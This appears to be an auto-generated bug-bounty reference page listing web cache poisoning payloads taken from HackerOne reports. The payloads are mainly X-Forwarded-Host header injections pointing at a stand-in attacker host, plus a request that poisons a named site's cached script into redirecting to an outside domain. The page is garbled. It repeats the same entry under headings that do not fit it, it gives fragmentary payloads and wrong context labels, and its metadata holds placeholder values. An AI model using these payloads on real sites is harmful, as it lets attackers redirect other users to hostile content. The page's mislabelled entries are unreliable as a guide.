---
vuln_type: "Cache_Poisoning"
file_type: "payloads"
total_reports: "17"
avg_bounty: "0"
max_bounty: "0"
severity_distribution: "critical:0% high:0% medium:0% low:100%"
owasp_categories: ["A00:2021"]
common_cwe: ["CWE-000"]
last_updated: "2026-04-09"
tags: ["Cache_Poisoning", "web", "api", "A00", "hunter-kb"]
related_vulns: ["Information_Disclosure", "Broken_Access_Control", "SSRF"]
---


# Cache Poisoning — Payloads

 This payload structure operates reliably against standard implementations lacking modern security boundaries or active request filtering components.


> [!TIP]
> Always iterate. Test a canary token to figure out parsing logic, then increment to full payload structures.

> [!WARNING]
> Execute payloads explicitly only against authorized systems in accordance with program SLA scopes.

## Basic Payloads

#### Payload 1

```javascript
X-Forwarded-Host: your_hackerz_site.com
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1025575](https://hackerone.com/reports/1025575)

#### Payload 2

```javascript
your_hackerz_site.com
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1160407](https://hackerone.com/reports/1160407)

## Context-Specific Payloads

#### Payload 3

```javascript
X-Forwarded-Host
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1173153](https://hackerone.com/reports/1173153)

## Advanced Payloads

#### Payload 4

```javascript
GET /test.js?cb=1 HTTP/2
Host: design.glassdoor.com
Sec-Ch-Ua: "Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)... This report describes a Cache_Poisoning issue affecting the target application surface. The disclosed finding is titled "Cache Poisoning allows..." and indicates exploitable input handling weaknesses. Observed report context: Hi, I found the following Cache Poisoning vulnerability: 1. Send the following request: ( this will poison `/test.js` into redirecting to `https://youst.in/test.js`)
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1183263](https://hackerone.com/reports/1183263)

## WAF Bypass Payloads

#### Payload 1

```javascript
X-Forwarded-Host: your_hackerz_site.com
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1025575](https://hackerone.com/reports/1025575)

## Encoding & Obfuscation

#### Payload 5

```javascript
-Forwarded-Host
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1219038](https://hackerone.com/reports/1219038)

## Polyglot Payloads

#### Payload 1

```javascript
X-Forwarded-Host: your_hackerz_site.com
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1025575](https://hackerone.com/reports/1025575)

## Blind / Out-of-Band Payloads

#### Payload 1

```javascript
X-Forwarded-Host: your_hackerz_site.com
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1025575](https://hackerone.com/reports/1025575)

## Chained Payloads

#### Payload 5

```javascript
-Forwarded-Host
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1219038](https://hackerone.com/reports/1219038)


